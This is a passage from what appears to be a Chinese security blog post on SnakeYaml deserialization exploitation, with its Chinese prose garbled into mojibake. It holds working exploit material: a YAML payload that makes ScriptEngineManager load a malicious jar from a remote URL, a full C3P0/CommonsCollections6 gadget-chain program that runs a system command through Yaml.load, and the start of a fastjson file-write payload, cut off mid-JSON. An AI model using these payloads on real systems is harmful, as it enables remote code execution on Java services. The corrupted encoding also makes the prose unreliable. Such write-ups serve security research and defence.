ç›®å½•ä¸‹æ˜¯å¦å­˜åœ¨ä»¥æ¥å£å…¨é™å®šåå‘½åçš„æ–‡ä»¶ã€‚å¦‚æœå­˜åœ¨ï¼Œåˆ™è¯»å–æ–‡ä»¶å†…å®¹ï¼Œè·å–å®ç°è¯¥æ¥å£çš„ç±»çš„å…¨é™å®šåï¼Œå¹¶é€šè¿‡ <code>Class.forName()</code> æ–¹æ³•åŠ è½½å¯¹åº”çš„ç±»ã€‚</p><p>è€Œä¸”å½“æˆ‘ä»¬è°ƒç”¨ <code>ServiceLoader.load(Class&lt;T&gt; service)</code> æ–¹æ³•æ—¶ï¼Œå¹¶ä¸ä¼šç«‹å³å°†æ‰€æœ‰å®ç°äº†è¯¥æ¥å£çš„ç±»éƒ½åŠ è½½è¿›æ¥ï¼Œè€Œæ˜¯è¿”å›ä¸€ä¸ª<code>æ‡’åŠ è½½è¿­ä»£å™¨</code>ã€‚</p><p><strong>åªæœ‰åœ¨ä½¿ç”¨è¿­ä»£å™¨éå†æ—¶ï¼Œæ‰ä¼šæŒ‰éœ€åŠ è½½å¯¹åº”çš„ç±»å¹¶åˆ›å»ºå…¶å®ä¾‹ã€‚</strong></p><p>æˆ‘ä»¬ä»æºç åˆ†æä¸‹</p><h3 id="SPIæºç åˆ†æ"><a href="#SPIæºç åˆ†æ" class="headerlink" title="SPIæºç åˆ†æ"></a>SPIæºç åˆ†æ</h3><p>é”å®šåˆ°<code>ServiceLoader.load(Class&lt;T&gt; service)</code>ï¼Œè°ƒç”¨äº†å¦ä¸€ä¸ªå‚æ•°çš„load</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241023150437749.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241023150437749.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241023150437749"></p><p>ç„¶åè°ƒç”¨ServiceLoaderæ„é€ å‡½æ•°</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241023150534513.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241023150534513.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241023150534513"></p><p>æ„é€ å‡½æ•°è°ƒç”¨reload</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241023150551381.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241023150551381.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241023150551381"></p><p>reloadç”Ÿæˆäº†ä¸€ä¸ªLazyIterator</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241023150602218.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241023150602218.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241023150602218"></p><p>è·Ÿè¿›åˆ°è¿™ä¸ªLazyIteratorå†…éƒ¨ç±»ï¼Œå¾ˆæ˜æ˜¾æˆ‘ä»¬åœ¨ä½¿ç”¨è¿™ä¸ªè¿­ä»£å™¨çš„æ—¶å€™ï¼Œä¼šå…ˆè°ƒç”¨hashNext-&gt;hasNextServiceï¼›å†è°ƒç”¨nextï¼Œè¿›è€Œè°ƒç”¨åˆ°nextService</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241023151104157.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241023151104157.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241023151104157"></p><p>åœ¨å®ƒçš„hasNextServiceè·å–äº†ç±»è·¯å¾„ä¸ºâ€META-IN&#x2F;services&#x2F;â€œ+ç±»åï¼Œå¹¶getResourceï¼Œæ³¨æ„è¿™é‡Œè·å–åˆ°çš„æ˜¯configsçš„è·¯å¾„ã€‚åé¢çš„parseæ˜¯è§£æè¿™ä¸ªconfigs</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241023153246135.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241023153246135.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241023153246135"></p><p>parseæŒ‰è¡Œè§£æconfigsæ–‡ä»¶</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241023153346166.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241023153346166.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241023153346166"></p><p>åœ¨ServiceLoader.LazyInteratorçš„nextServiceå†…å®Œæˆäº†Class.forNameåˆå§‹åŒ–å’ŒnewInstanceå®ä¾‹åŒ–</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241023151007315.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241023151007315.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241023151007315"></p><p>å¦‚æœloadçš„å‚æ•°å¯ä»¥æ˜¯http URLï¼Œæ˜¯ä¸æ˜¯æ„å‘³ç€ServiceLoader.loadèƒ½åŠ è½½è¿œç¨‹META-INF&#x2F;servicesä¸‹çš„æ¶æ„ç±»ï¼Ÿ</p><h3 id="SPIä½¿ç”¨"><a href="#SPIä½¿ç”¨" class="headerlink" title="SPIä½¿ç”¨"></a>SPIä½¿ç”¨</h3><p>å…ˆçœ‹çœ‹SPIæ€ä¹ˆç”¨çš„ï¼š</p><ul><li><p>å®šä¹‰æ¥å£ï¼šé¦–å…ˆéœ€è¦å®šä¹‰ä¸€ä¸ªæ¥å£ï¼Œæ‰€æœ‰å®ç°è¯¥æ¥å£çš„ç±»éƒ½å°†è¢«æ³¨å†Œä¸ºæœåŠ¡æä¾›è€…ã€‚</p></li><li><p>åˆ›å»ºå®ç°ç±»ï¼šåˆ›å»ºä¸€ä¸ªæˆ–å¤šä¸ªå®ç°æ¥å£çš„ç±»ï¼Œè¿™äº›ç±»å°†ä½œä¸ºæœåŠ¡æä¾›è€…ã€‚</p></li><li><p>é…ç½®æ–‡ä»¶ï¼šåœ¨ META-INF&#x2F;services ç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ªä»¥æ¥å£å…¨é™å®šåå‘½åçš„æ–‡ä»¶ï¼ˆä¹Ÿå°±æ˜¯æˆ‘ä»¬å‰é¢åˆ†æçš„configsï¼‰ï¼Œæ–‡ä»¶å†…å®¹ä¸ºå®ç°è¯¥æ¥å£çš„ç±»çš„å…¨é™å®šåï¼Œæ¯ä¸ªç±»åå ä¸€è¡Œã€‚</p></li><li><p>åŠ è½½ä½¿ç”¨æœåŠ¡ï¼šä½¿ç”¨ java.util.ServiceLoader ç±»çš„é™æ€æ–¹æ³• load(Class service) åŠ è½½æœåŠ¡ï¼Œé»˜è®¤æƒ…å†µä¸‹ä¼šåŠ è½½ classpath ä¸­æ‰€æœ‰ç¬¦åˆæ¡ä»¶çš„æä¾›è€…ã€‚è°ƒç”¨ ServiceLoader å®ä¾‹çš„ iterator() æ–¹æ³•è·å–è¿­ä»£å™¨ï¼Œéå†è¿­ä»£å™¨å³å¯è·å–æ‰€æœ‰å®ç°äº†è¯¥æ¥å£çš„ç±»çš„å®ä¾‹ã€‚</p></li></ul><p>æ‰€ä»¥æˆ‘ä»¬æœ¬åœ°éœ€è¦åœ¨META-INF&#x2F;servicesåˆ›å»ºä¸€ä¸ªæ–‡ä»¶ï¼ˆç”¨äºconfigsåŠ è½½ï¼‰ï¼Œæ–‡ä»¶å†…å®¹æ˜¯æˆ‘ä»¬éœ€è¦åŠ è½½çš„ç±»çš„å…¨é™å®šå</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241023153838191.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241023153838191.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241023153838191"></p><p>ç„¶åæ¶æ„ç±»å®ç°ScriptEngineFactroyæ¥å£ï¼Œå¹¶åœ¨æ„é€ å‡½æ•° or é™æ€ä»£ç å—å†™æ¶æ„ä»£ç ã€‚</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241023153932389.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241023153932389.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241023153932389"></p><p>ä¸ºä»€ä¹ˆæ˜¯ScriptEngineFactoryæ¥å£ï¼Ÿ</p><p>æ ¹æ®å‰é¢çš„å†…å®¹ï¼Œæˆ‘ä»¬ä¸éš¾æ¨æ–­æ¼æ´è§¦å‘ä¸ºServiceLoader.loadç”Ÿæˆè¿­ä»£å™¨ï¼Œè°ƒç”¨è¿­ä»£å™¨æ—¶å®Œæˆä»»æ„ç±»åŠ è½½</p><p>æˆ‘ä»¬çœ‹ä¸‹ScriptEngineFactoryå®ŒæˆSPIçš„ä»£ç ï¼š</p><p>ScriptEngineFactory.initEngineså…ˆè°ƒç”¨getServiceLoaderï¼Œç„¶åè·å–äº†è¿­ä»£å™¨ï¼Œå¹¶åœ¨å¾ªç¯ä¸­ä½¿ç”¨äº†è¿­ä»£å™¨ï¼ˆhasNext-&gt;nextï¼‰</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241023154445075.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241023154445075.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241023154445075"></p><p>å…¶ä¸­getServiceLoaderå°±æ˜¯ServiceLoader.load</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241023154554020.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241023154554020.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241023154554020"></p><p>è¿™é‡Œloadä¼ å…¥çš„serviceæ—¶ScriptEngineFactoryï¼Œæ‰€ä»¥æˆ‘ä»¬çš„æ¶æ„ç±»éœ€è¦å®ç°ScriptEngineFactoryæ¥å£</p><h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><p>META-INFç›®å½•ç»“æ„ï¼Œæ”¾configsã€‚æ¶æ„ç±»æ”¾åœ¨æºä»£ç ç›®å½•</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241023164923527.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241023164923527.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241023164923527"></p><p>ä¸ºäº†ä¸€ä¸ªURLåŒæ—¶å¯¹å¤–éƒ¨æä¾›è¿™ä¸¤ä¸ªæ–‡ä»¶ç”¨äºåŠ è½½ï¼Œéœ€è¦æ‰“åŒ…æˆjarï¼Œæˆ‘æ‰“åŒ…å¥½äº†å‘å¸ƒåœ¨äº†my githubï¼š</p><p><a href="https://github.com/godownio/java_unserial_attackcode/blob/master/src/main/java/org/exploit/third/SnakeYaml/EvilServiceScriptEngineFactory_jdk8.jar">https://github.com/godownio/java_unserial_attackcode/blob/master/src/main/java/org/exploit/third/SnakeYaml/EvilServiceScriptEngineFactory_jdk8.jar</a></p><p>POCï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ScriptEngineManger</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">poc</span> <span class="operator">=</span> <span class="string">&quot;!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\&quot;http://127.0.0.1:8888/EvilServiceScriptEngineFactory_jdk8.jar\&quot;]]]]\n&quot;</span>;</span><br><span class="line">        <span class="type">Yaml</span> <span class="variable">yaml</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Yaml</span>();</span><br><span class="line">        yaml.load(poc);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ³¨æ„éœ€è¦jdkç‰ˆæœ¬ç›¸åŒ</p><h3 id="å…¶ä»–ä½¿ç”¨SPIçš„åœºæ™¯"><a href="#å…¶ä»–ä½¿ç”¨SPIçš„åœºæ™¯" class="headerlink" title="å…¶ä»–ä½¿ç”¨SPIçš„åœºæ™¯"></a>å…¶ä»–ä½¿ç”¨SPIçš„åœºæ™¯</h3><p>ä¸€äº›å…¶ä»–ä½¿ç”¨SPIçš„åœºæ™¯ï¼Œç®€å•çœ‹çœ‹</p><table><thead><tr><th>åº”ç”¨åç§°</th><th>å…·ä½“åº”ç”¨åœºæ™¯</th></tr></thead><tbody><tr><td>æ•°æ®åº“é©±åŠ¨ç¨‹åºåŠ è½½</td><td><code>JDBC</code>ä¸ºäº†å®ç°<code>å¯æ’æ‹”</code>çš„æ•°æ®åº“é©±åŠ¨ï¼Œåœ¨Java.sql.Driveræ¥å£ä¸­å®šä¹‰äº†ä¸€ç»„æ ‡å‡†çš„APIè§„èŒƒï¼Œè€Œå…·ä½“çš„æ•°æ®åº“å‚å•†åˆ™éœ€è¦å®ç°è¿™ä¸ªæ¥å£ï¼Œä»¥æä¾›è‡ªå·±çš„æ•°æ®åº“é©±åŠ¨ç¨‹åºã€‚åœ¨Javaä¸­ï¼ŒJDBCé©±åŠ¨ç¨‹åºçš„åŠ è½½å°±æ˜¯é€šè¿‡SPIæœºåˆ¶å®ç°çš„ã€‚</td></tr><tr><td>æ—¥å¿—æ¡†æ¶çš„å®ç°</td><td>æµè¡Œçš„<code>å¼€æºæ—¥å¿—æ¡†æ¶</code>ï¼Œå¦‚<code>Log4jã€SLF4Jå’ŒLogback</code>ç­‰ï¼Œéƒ½é‡‡ç”¨äº†SPIæœºåˆ¶ã€‚ç”¨æˆ·å¯ä»¥æ ¹æ®è‡ªå·±çš„éœ€æ±‚é€‰æ‹©åˆé€‚çš„æ—¥å¿—å®ç°ï¼Œè€Œä¸éœ€è¦ä¿®æ”¹ä»£ç ã€‚</td></tr><tr><td>Springæ¡†æ¶</td><td><code>Springæ¡†æ¶</code>ä¸­çš„BeanåŠ è½½æœºåˆ¶å°±ä½¿ç”¨äº†SPIæ€æƒ³ï¼Œé€šè¿‡è¯»å–classpathä¸‹çš„META-INF&#x2F;spring.factoriesæ–‡ä»¶æ¥<code>åŠ è½½å„ç§è‡ªå®šä¹‰çš„Bean</code>ã€‚</td></tr><tr><td>Dubboæ¡†æ¶</td><td><code>Dubboæ¡†æ¶</code>ä¹Ÿä½¿ç”¨äº†SPIæ€æƒ³ï¼Œé€šè¿‡æ¥å£<code>æ³¨è§£@SPI</code>å£°æ˜æ‰©å±•ç‚¹æ¥å£ï¼Œå¹¶åœ¨classpathä¸‹çš„META-INF&#x2F;dubboç›®å½•ä¸­æä¾›å®ç°ç±»çš„é…ç½®æ–‡ä»¶ï¼Œæ¥å®ç°æ‰©å±•ç‚¹çš„åŠ¨æ€åŠ è½½ã€‚</td></tr><tr><td>MyBatisæ¡†æ¶</td><td><code>MyBatisæ¡†æ¶</code>ä¸­çš„æ’ä»¶æœºåˆ¶ä¹Ÿä½¿ç”¨äº†SPIæ€æƒ³ï¼Œé€šè¿‡åœ¨classpathä¸‹çš„META-INF&#x2F;servicesç›®å½•ä¸­å­˜æ”¾æ’ä»¶æ¥å£çš„å®ç°ç±»è·¯å¾„ï¼Œæ¥å®ç°<code>æ’ä»¶çš„åŠ è½½å’Œæ‰§è¡Œ</code>ã€‚</td></tr><tr><td>Nettyæ¡†æ¶</td><td><code>Nettyæ¡†æ¶</code>ä¹Ÿä½¿ç”¨äº†SPIæœºåˆ¶ï¼Œè®©ç”¨æˆ·å¯ä»¥æ ¹æ®è‡ªå·±çš„éœ€æ±‚é€‰æ‹©åˆé€‚çš„<code>ç½‘ç»œåè®®å®ç°æ–¹å¼</code>ã€‚</td></tr><tr><td>Hadoopæ¡†æ¶</td><td><code>Hadoopæ¡†æ¶</code>ä¸­çš„è¾“å…¥è¾“å‡ºæ ¼å¼ä¹Ÿä½¿ç”¨äº†SPIæ€æƒ³ï¼Œé€šè¿‡åœ¨classpathä¸‹çš„META-INF&#x2F;servicesç›®å½•ä¸­å­˜æ”¾è¾“å…¥è¾“å‡ºæ ¼å¼æ¥å£çš„å®ç°ç±»è·¯å¾„ï¼Œæ¥å®ç°<code>è¾“å…¥è¾“å‡ºæ ¼å¼çš„çµæ´»é…ç½®å’Œåˆ‡æ¢</code>ã€‚</td></tr></tbody></table><h2 id="C3P0ä¸å‡ºç½‘"><a href="#C3P0ä¸å‡ºç½‘" class="headerlink" title="C3P0ä¸å‡ºç½‘"></a>C3P0ä¸å‡ºç½‘</h2><p>ä¸å‡ºç½‘çš„æƒ…å†µèƒ½æ‰“C3P0ï¼Œéœ€è¦C3P0ä¾èµ–</p><p>åˆ©ç”¨çš„æ˜¯C3P0ImplUtils.parseUserridesAsStringåŠ è½½å­—èŠ‚ç ï¼Œä¹‹å‰åœ¨åˆ†æC3P0+jacksonè”åˆæ‰“ä¸å‡ºç½‘æ—¶åˆ†æè¿‡äº†ï¼Œç§»æ­¥ï¼š</p><p><a href="https://godownio.github.io/2024/10/26/c3p0-lian/#SerializableUtils%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E8%8A%82%E7%A0%81">https://godownio.github.io/2024/10/26/c3p0-lian/#SerializableUtils%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E8%8A%82%E7%A0%81</a></p><p>æ¢æˆYaml.loadè§¦å‘setterï¼ˆsetUserOverridesAsStringï¼‰</p><p>SnakeYaml æ‰“C3P0 CC6 POCï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">C3P0ImplUtils_HEX_CC6</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">GenerateCC6</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(map, <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="string">&quot;godown&quot;</span>));</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;test1&quot;</span>);</span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(tiedMapEntry, <span class="string">&quot;test2&quot;</span>);</span><br><span class="line">        map.remove(<span class="string">&quot;test1&quot;</span>);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">lazymapClass</span> <span class="operator">=</span> lazyMap.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">factory</span> <span class="operator">=</span> lazymapClass.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        factory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">modifiersField</span> <span class="operator">=</span> Field.class.getDeclaredField(<span class="string">&quot;modifiers&quot;</span>);</span><br><span class="line">        modifiersField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        modifiersField.setInt(factory, factory.getModifiers() &amp; ~Modifier.FINAL);</span><br><span class="line">        factory.set(lazyMap, chainedTransformer);</span><br><span class="line">        serialize(hashMap);</span><br><span class="line">        <span class="keyword">return</span> binaryFileToHexString(<span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;cc6.ser&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;cc6.ser&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        oos.close();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">binaryFileToHexString</span><span class="params">(File file)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">hexString</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        <span class="keyword">try</span> (<span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(file)) &#123;</span><br><span class="line">            <span class="type">byte</span>[] buffer = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">            <span class="type">int</span> bytesRead;</span><br><span class="line">            <span class="keyword">while</span> ((bytesRead = fis.read(buffer)) != -<span class="number">1</span>) &#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; bytesRead; i++) &#123;</span><br><span class="line">                    hexString.append(String.format(<span class="string">&quot;%02X&quot;</span>, buffer[i]));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> hexString.toString();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;HexAsciiSerializedMap1&quot;</span>+GenerateCC6()+<span class="string">&quot;1&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">poc</span> <span class="operator">=</span> aposToQuotes(<span class="string">&quot;!!com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#x27;userOverridesAsString&#x27;:&#x27;&quot;</span>+payload+<span class="string">&quot;&#x27;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#125;&quot;</span>);</span><br><span class="line">        System.out.printf(poc);</span><br><span class="line">        <span class="type">Yaml</span> <span class="variable">yaml</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Yaml</span>();</span><br><span class="line">        yaml.load(poc);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">aposToQuotes</span><span class="params">(String json)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> json.replace(<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&quot;\&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="MarshalOutputStreamå†™æ–‡ä»¶"><a href="#MarshalOutputStreamå†™æ–‡ä»¶" class="headerlink" title="MarshalOutputStreamå†™æ–‡ä»¶"></a>MarshalOutputStreamå†™æ–‡ä»¶</h2><p>åˆ©ç”¨äº†fastjson1.2.68çš„æ€è·¯ï¼Œç”±äºsnakeYamlè°ƒç”¨æ„é€ å‡½æ•°å¹¶ä¸ä¼šä½¿ç”¨ASMUtils.lookupParametersNameå»å¯»æ‰¾å¸¦å‚æ•°åçš„æ„é€ å‡½æ•°ï¼Œæ‰€ä»¥æ¯”è¾ƒé€šç”¨</p><p>fastjson 1.2.68çš„åŸç”ŸJRE8 payloadï¼š</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    &#x27;@type&#x27;<span class="punctuation">:</span><span class="string">&quot;java.lang.AutoCloseable&quot;</span><span class="punctuation">,</span></span><br><span class="line">    &#x27;@type&#x27;<span class="punctuation">:</span>&#x27;sun.rmi.server.MarshalOutputStream&#x27;<span class="punctuation">,</span></span><br><span class="line">    &#x27;out&#x27;<span class="punctuation">:</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">        &#x27;@type&#x27;<span class="punctuation">:</span>&#x27;java.util.zip.InflaterOutputStream&#x27;<span class="punctuation">,</span></span><br><span class="line">        &#x27;out&#x27;<span class="punctuation">:</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">           &#x27;@type&#x27;<span class="punctuation">:</span>&#x27;java.io.FileOutputStream&#x27;<span class="punctuation">,</span></span><br><span class="line">           &#x27;file&#x27;<span class="punctuation">:</span>&#x27;dst&#x27;<span class="punctuation">,</span></span><br><span class="line">           &#x27;append&#x27;<span class="punctuation">:</span><span class="literal"><span class="keyword">false</span></span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        &#x27;infl&#x27;<span class="punctuation">:</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">      